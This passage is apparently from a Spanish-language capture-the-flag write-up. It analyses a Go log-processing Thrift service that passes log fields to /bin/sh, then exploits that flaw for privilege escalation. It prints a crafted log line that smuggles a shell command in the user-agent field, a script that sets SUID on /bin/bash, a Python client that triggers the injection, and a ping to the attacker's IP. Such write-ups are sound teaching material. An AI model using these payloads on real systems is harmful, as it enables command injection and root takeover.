+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>    ipRegex := regexp.MustCompile(<span style="color:#0ff;font-weight:bold">`\b(?:\d{1,3}\.){3}\d{1,3}\b`</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>    userAgentRegex := regexp.MustCompile(<span style="color:#0ff;font-weight:bold">`&#34;user-agent&#34;:&#34;([^&#34;]+)&#34;`</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>    outputFile, err := os.Create(<span style="color:#0ff;font-weight:bold">&#34;output.log&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>    <span style="color:#fff;font-weight:bold">if</span> err != <span style="color:#fff;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>        fmt.Println(<span style="color:#0ff;font-weight:bold">&#34;Error creating output file:&#34;</span>, err)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>        <span style="color:#fff;font-weight:bold">return</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>    <span style="color:#fff;font-weight:bold">defer</span> outputFile.Close()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>    scanner := bufio.NewScanner(file)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>    <span style="color:#fff;font-weight:bold">for</span> scanner.Scan() {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>        line := scanner.Text()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>        ip := ipRegex.FindString(line)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>        userAgentMatch := userAgentRegex.FindStringSubmatch(line)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>        <span style="color:#fff;font-weight:bold">var</span> userAgent <span style="color:#fff;font-weight:bold">string</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>        <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">len</span>(userAgentMatch) &gt; <span style="color:#ff0;font-weight:bold">1</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>            userAgent = userAgentMatch[<span style="color:#ff0;font-weight:bold">1</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>        timestamp := time.Now().Format(time.RFC3339)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>        logs := fmt.Sprintf(<span style="color:#0ff;font-weight:bold">&#34;echo &#39;IP Address: %s, User-Agent: %s, Timestamp: %s&#39; &gt;&gt; output.log&#34;</span>, ip, userAgent, timestamp)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>        exec.Command{<span style="color:#0ff;font-weight:bold">&#34;/bin/sh&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;-c&#34;</span>, logs}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;Log file processed&#34;</span>,<span style="color:#fff;font-weight:bold">nil</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>}</span></span></code></pre></div>
+<p>Este método toma como parámetro una ruta de archivo (<code>filePath</code>), lee su contenido línea por línea, y extrae dos tipos de información usando expresiones regulares:</p>
+<ol>
+<li>
+<p><strong>Direcciones IP</strong> (patrón: <code>\b(?:\d{1,3}\.){3}\d{1,3}\b</code>).</p>
+</li>
+<li>
+<p><strong>User-Agent</strong> (patrón: <code>&quot;user-agent&quot;:&quot;([^&quot;]+)&quot;</code>), para extraer la cadena de User-Agent del log.</p>
+</li>
+</ol>
+<ul>
+<li><strong>Procesamiento</strong>: Por cada línea del archivo, encuentra una dirección IP y un User-Agent. Si los encuentra, genera una cadena con esta información junto con una marca de tiempo (<code>timestamp</code>).</li>
+<li><strong>Salida</strong>: En lugar de escribir directamente en el archivo, utiliza el comando <code>echo</code> de shell (<code>/bin/sh</code>) para redirigir la información procesada al archivo <code>output.log</code>.</li>
+</ul>
+<p>El error en este código es que por cada Log se ejecuta por alguna razón un <code>/bin/sh</code> para guardar a un archivo en vez de utilizar la forma nativa en Go para hacer esto. Esto significa que si conseguimos insertar un log malicioso podríamos ejecutar un comando en la máquina víctima.</p>
+<p>Todavía no se si este proceso lo está ejecutando <code>root</code> ya que aún no he enumerado a fondo la máquina víctima, pero ya estoy hecho a los CTF&rsquo;s y viendo que esta máquina la resolvieron en 10 minutos la parte de la escalada de privilegios&hellip;</p>
+<p>Entonces, si tenemos un log que por ejemplo</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-swift" data-lang="swift"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#ff0;font-weight:bold">127.0</span>.<span style="color:#ff0;font-weight:bold">0.1</span> - - [<span style="color:#ff0;font-weight:bold">12</span>/Sep/<span style="color:#ff0;font-weight:bold">2024</span>:<span style="color:#ff0;font-weight:bold">15</span>:<span style="color:#ff0;font-weight:bold">03</span>:<span style="color:#ff0;font-weight:bold">21</span> +<span style="color:#ff0;font-weight:bold">0000</span>] <span style="color:#0ff;font-weight:bold">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">200</span> <span style="color:#ff0;font-weight:bold">2326</span> <span style="color:#0ff;font-weight:bold">&#34;-&#34;</span> <span style="color:#0ff;font-weight:bold">&#34;user-agent</span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold">:</span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold">Mozilla/5.0</span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold">; /bin/bash -c &#39;bash /tmp/pwn.sh&#39; #&#34;</span></span></span></code></pre></div>
+<p>Esto significa que por línea de comandos se ejecutará lo siguiente:</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#39;IP Address: 127.0.0.1, User-Agent: Mozilla/5.0&#34;; /bin/bash -c &#39;</span>bash /tmp/pwn.sh<span style="color:#0ff;font-weight:bold">&#39; #, Timestamp: 2024-09-12T15:03:21Z&#39;</span> &gt;&gt; output.log</span></span></code></pre></div>
+<h2 id="command-injection">Command Injection</h2>
+<p>Por lo cual se ejecutaría un script en <code>/tmp/pwn.sh</code>
+Entonces en la máquina víctima nos vamos a crear el script malicioso.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>margo@caption:/tmp$ cat pwn.sh 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>#!/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span><span style="color:#f00"></span>chmod u+s /bin/bash
+</span></span></code></pre></div>
+<p>También vamos a crear el log malicioso en <code>/tmp/evil.log</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>margo@caption:/tmp$ cat evil.log 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>127.0.0.1 - - [12/Sep/2024:15:03:21 +0000] &#34;GET / HTTP/1.1&#34; 200 2326 &#34;-&#34; &#34;user-agent\&#34;:\&#34;Mozilla/5.0\&#34;; /bin/bash -c &#39;bash /tmp/pwn.sh&#39; #&#34;
+</span></span></code></pre></div>
+<p>Ahora como he dicho antes, necesitamos el archivo <code>log_service.thrift</code> para poder mandar una petición al servidor, así que en nuestra máquina de atacante nos lo creamos.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ cat log_service.thrift 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>namespace go log_service
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>service LogService {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>        string ReadLogFile(1: string filePath)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>}
+</span></span></code></pre></div>
+<p>Y vamos a hacer un simple script en Python que interactúe con este protocolo y lea el archivo log malicioso que hemos creado para que se acontezca la inyección de comandos.</p>
+<p>Primero instalamos <code>thrift</code> para python.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ pip install thrift
+</span></span></code></pre></div>
+<p>Ahora instalamos <code>thrift-compiler</code> para convertir el archivo <code>log_service.thrift</code> en un formato para python.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo apt update
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>$ sudo apt install thrift-compiler
+</span></span></code></pre></div>
+<p>Ahora generamos los archivos necesarios para python para usar el objeto de Thrift.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ thrift --gen py log_service.thrift
+</span></span></code></pre></div>
+<p>Vemos que me ha creado un directorio <code>gen-py</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>gen-py  log_service.thrift
+</span></span></code></pre></div>
+<p>Este es el script que he creado, simplemente hace uso de Thrift y del objeto para comunicarse con el servicio que está en el puerto 9090 &ldquo;port-forwadeado&rdquo; y enviar que quiero procesar el log en <code>/tmp/evil.log</code>.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">import</span> sys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold">from</span> thrift <span style="color:#fff;font-weight:bold">import</span> Thrift
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#fff;font-weight:bold">from</span> thrift.transport <span style="color:#fff;font-weight:bold">import</span> TSocket
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#fff;font-weight:bold">from</span> thrift.transport <span style="color:#fff;font-weight:bold">import</span> TTransport
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#fff;font-weight:bold">from</span> thrift.protocol <span style="color:#fff;font-weight:bold">import</span> TBinaryProtocol
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#fff;font-weight:bold">from</span> log_service <span style="color:#fff;font-weight:bold">import</span> LogService  <span style="color:#007f7f"># El archivo generado a partir del .thrift</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#fff;font-weight:bold">def</span> main():
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>    <span style="color:#fff;font-weight:bold">try</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>        <span style="color:#007f7f"># Crear transporte</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>        transport = TSocket.TSocket(<span style="color:#0ff;font-weight:bold">&#39;127.0.0.1&#39;</span>, <span style="color:#ff0;font-weight:bold">9090</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>        <span style="color:#007f7f"># Buffer del transporte</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>        transport = TTransport.TBufferedTransport(transport)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>        <span style="color:#007f7f"># Protocolo binario</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>        protocol = TBinaryProtocol.TBinaryProtocol(transport)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>        <span style="color:#007f7f"># Crear cliente</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>        client = LogService.Client(protocol)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>        <span style="color:#007f7f"># Abrir el transporte</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>        transport.open()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>        <span style="color:#007f7f"># Hacer la solicitud para leer el log</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>        result = client.ReadLogFile(<span style="color:#0ff;font-weight:bold">&#39;/tmp/evil.log&#39;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>        <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Resultado de la lectura del log: </span><span style="color:#0ff;font-weight:bold">{</span>result<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>        <span style="color:#007f7f"># Cerrar el transporte</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>        transport.close()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>    <span style="color:#fff;font-weight:bold">except</span> Thrift.TException <span style="color:#fff;font-weight:bold">as</span> tx:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>        <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Error: </span><span style="color:#0ff;font-weight:bold">{</span>tx.message<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span><span style="color:#fff;font-weight:bold">if</span> __name__ == <span style="color:#0ff;font-weight:bold">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>    main()</span></span></code></pre></div>
+<p>Si lo ejecutamos.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 pwn.py 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Resultado de la lectura del log: Log file processed
+</span></span></code></pre></div>
+<p>Pero no hemos conseguido el SUID en la <code>bash</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>margo@caption:/tmp$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>-rwxr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+</span></span></code></pre></div>
+<p>Vamos a hacer una prueba.</p>
+<p>Voy a modificar el script a ejecutar para mandarme un ping.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>margo@caption:/tmp$ cat /tmp/pwn.sh 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>#!/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span><span style="color:#f00"></span>ping -c 1 10.10.14.104
+</span></span></code></pre></div>
+<p>Y llegué a la conclusión que lo que estaba mal era el log malicioso.</p>
+<p>Entonces.</p>
+<p>La expresión regular para <code>userAgentRegex</code> es:</p>
+
+
+
+
+
+
+<pre tabindex="0"><code class="language-regex" data-lang="regex">&#34;user-agent&#34;:&#34;([^&#34;]+)&#34;</code></pre>
+<p>Esto significa que está buscando una cadena que coincida con el formato:</p>
+<ul>
+<li><strong>&ldquo;user-agent&rdquo;</strong>: Esta parte debe aparecer literalmente en el texto.</li>
+<li><strong>&quot;:&quot;</strong>: Luego debe haber dos puntos seguidos de una comilla doble.</li>
+<li><strong>([^&quot;]+)</strong>: Este grupo captura cualquier conjunto de caracteres que no contenga comillas dobles (<code>&quot;</code>) y los guarda como el valor del &ldquo;User-Agent&rdquo;.</li>
+<li><strong>&quot;</strong>: Finalmente, debe haber otra comilla doble para cerrar el valor.</li>
+</ul>
+<p>Y en el log que tengo ahora creado, estamos escapando las comillas y en general está mas formulado.</p>
+<p>Por lo cual podemos crear un archivo que si cumpla con estos parámetros.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>margo@caption:/tmp$ cat evil.log 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>192.168.1.1 - - [12/Sep/2024:15:03:21 +0000] &#34;POST /login HTTP/1.1&#34; 200 1456 &#34;-&#34; &#34;user-agent&#34;:&#34;&#39;; /bin/bash /tmp/pwn.sh #&#34;
+</span></span></code></pre></div>
+<p>Y al intentar procesar el log ahora.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 pwn.py 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Resultado de la lectura del log: Log file processed
+</span></span></code></pre></div>
+<p>Vemos que me llega el ping, por lo cual ahora si que estamos haciendo correctamente la inyección de comandos.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo tcpdump -i tun0 icmp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
